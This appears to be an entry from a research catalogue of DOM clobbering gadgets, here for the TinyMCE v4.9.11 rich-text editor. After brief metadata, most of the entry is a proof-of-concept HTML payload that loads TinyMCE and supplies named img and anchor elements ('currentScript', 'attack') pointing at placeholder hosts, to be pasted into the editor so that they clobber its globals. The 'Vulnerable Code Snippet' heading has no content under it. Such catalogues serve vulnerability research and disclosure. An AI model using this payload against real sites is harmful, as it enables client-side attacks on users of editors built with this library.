## TinyMCE

### Meta

+ Library: TinyMCE-v4
+ Version: v4.9.11
+ Stars: 14.9K
+ Fingerprint: `typeof(window.tinymce) !== undefined`
+ Input: Copy&Paste
+ Sanitizer: N/A
+ Capability: Any Tag & Any named property
+ CVE: N/A
+ Status: N/A

### Library

https://github.com/tinymce/tinymce


### Vulnerable Code Snippet

### PoC 

```html
<!--Library-->
<script src="https://cdn.tiny.cloud/1/kvw088syhtkdcjivzwu785cisjwpon4zfjj2isannsfsw555/tinymce/4/tinymce.min.js" referrerpolicy="origin"></script>

<script>
  tinymce.init({
  selector: 'textarea#default'
});
</script>
<textarea id="default">Hello, World!</textarea>
<!--Library-->


<!--Payload-->
<img name="currentScript" src="https://xxx.xxx.xxx">
<img name="attack" src="https://xxx.xxx.xxx">
<a name="attack" href="https://xxx.xxx.xxx">AAA</a>
<p>Copy & Paste the following rendered HTML elements to the editor and Run the following code: tinymce.activeEditor.getContent("default");</p>
<!--Payload-->
```